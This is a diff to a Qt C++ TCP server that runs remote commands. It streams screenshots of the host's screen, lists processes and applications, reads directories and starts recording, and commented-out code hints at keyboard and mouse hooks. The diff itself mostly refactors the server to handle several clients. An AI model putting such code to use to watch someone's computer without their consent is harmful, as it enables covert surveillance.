@@ -11,6 +11,8 @@ Server::Server(QObject *parent)
 {
     initServer();
     connect(tcpServer, &QTcpServer::newConnection, this, &Server::newConnection);
+
+    clients = QList<QTcpSocket*>();
 }
 
 void Server::initServer()
@@ -40,20 +42,25 @@ void Server::initServer()
     port = QString::number(tcpServer->serverPort());
 }
 
-void Server::sendMessage(const QString &msg)
+void Server::sendMessage(QTcpSocket* sender, const QString &msg)
 {
-    if (!curClient) return;
+//    QTcpSocket *clientSocket = static_cast<QTcpSocket*>(sender());
+//    if (clientSocket != nullptr) {
+//        qDebug() << "send message client connection not null";
+//    }
     QByteArray block;
     QDataStream out(&block, QIODevice::WriteOnly);
     out.setVersion(QDataStream::Qt_6_5);
 
     out << tr("string") << msg;
-    curClient->write(block);
+    sender->write(block);
 }
 
-void Server::sendScreenshot(const QPixmap &screenshot) {
-    if (!curClient) return;
-
+void Server::sendScreenshot(QTcpSocket* sender, const QPixmap &screenshot) {
+//    QTcpSocket *clientSocket = static_cast<QTcpSocket*>(sender());
+//    if (clientSocket != nullptr) {
+//        qDebug() << "send screenshot client connection not null";
+//    }
     QPixmap resizedScreenshot = screenshot.scaled(800, 800, Qt::KeepAspectRatio, Qt::SmoothTransformation);
 
     QByteArray block;
@@ -67,11 +74,11 @@ void Server::sendScreenshot(const QPixmap &screenshot) {
     buffer.open(QIODevice::WriteOnly);
     resizedScreenshot.save(&buffer, "PNG");
     out << tr("image") << byteArray;
-    curClient->write(block);
+    sender->write(block);
 }
 
-void Server::sendFileStructure(const QFileSystemModel &model) {
-    if (!curClient) return;
+void Server::sendFileStructure(QTcpSocket* sender, const QFileSystemModel &model) {
+//    QTcpSocket *clientSocket = static_cast<QTcpSocket*>(sender());
     QByteArray block;
     QDataStream out(&block, QIODevice::WriteOnly);
     out.setVersion(QDataStream::Qt_6_5);
@@ -91,13 +98,19 @@ void Server::sendFileStructure(const QFileSystemModel &model) {
 
 //    out << tr("file model") << model;
     // Send the QByteArray over the network, e.g. via a QTcpSocket
-    curClient->write(block);
+    sender->write(block);
 }
 
 
 void Server::readMessage() {
+    QTcpSocket *clientConnection = static_cast<QTcpSocket*>(sender());
+    if (clientConnection != nullptr) {
+        qDebug() << "read message client connection not null";
+    }
     qDebug() << "A message just got to server!";
 
+    in.setDevice(clientConnection);
+    in.setVersion(QDataStream::Qt_6_5);
     in.startTransaction();
 
     QString message;
@@ -109,11 +122,11 @@ void Server::readMessage() {
 //    statusLabel->setText(message);
 
     if (message == tr("list applications")) {
-        sendMessage("here are the applications: ");
+        sendMessage(clientConnection, "here are the applications: ");
 //        tracking_keyboard();
     }
     else if (message == tr("list processes")) {
-        sendMessage("here are the processes: ");
+        sendMessage(clientConnection, "here are the processes: ");
 
 //        startHook();
     }
@@ -128,8 +141,10 @@ void Server::readMessage() {
 //        QPixmap screenshot = QGuiApplication::primaryScreen()->grabWindow(0);
 ////        emit(display(screenshot));
 //        sendScreenshot(screenshot);
-        QTimer *timer = new QTimer(this);
-        connect(timer, &QTimer::timeout, this, &Server::stream);
+        QTimer *timer = new QTimer;
+        connect(timer, &QTimer::timeout, this, [=]() {
+            stream(clientConnection);
+        });
         timer->start();
         QTimer::singleShot(3000, timer, &QTimer::stop);
     }
@@ -137,7 +152,7 @@ void Server::readMessage() {
         qDebug() << "show directories";
         QFileSystemModel model;
         model.setRootPath("C:\\");
-        sendFileStructure(model);
+//        sendFileStructure(model);
     }
     else if (message == tr("recording")){
         if (recorder == nullptr)
@@ -154,25 +169,30 @@ void Server::readMessage() {
     emit(readyRead(message));
 }
 
-void Server::stream() {
+void Server::stream(QTcpSocket* clientConnection) {
     QPixmap screenshot = QGuiApplication::primaryScreen()->grabWindow(0);
     //        emit(display(screenshot));
-    sendScreenshot(screenshot);
+    sendScreenshot(clientConnection, screenshot);
 }
 
 void Server::processData() {
+    QTcpSocket *clientSocket = static_cast<QTcpSocket*>(sender());
     qDebug() << "is this on?";
     QString data = m_process->readAllStandardOutput();
-    sendMessage(data);
+    sendMessage(clientSocket, data);
 }
 
 void Server::newConnection() {
     QTcpSocket *clientConnection = tcpServer->nextPendingConnection();
     connect(clientConnection, &QTcpSocket::readyRead, this, &Server::readMessage);
+    connect(clientConnection, &QTcpSocket::disconnected, this, &Server::disconnected);
+    clients.append(clientConnection);
 
-    curClient = clientConnection;
-    in.setDevice(clientConnection);
-    in.setVersion(QDataStream::Qt_6_5);
+}
+
+void Server::disconnected() {
+    QTcpSocket *clientSocket = static_cast<QTcpSocket*>(sender());
+    clients.removeOne(clientSocket);
 }
 
 //LRESULT CALLBACK Server::MouseHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
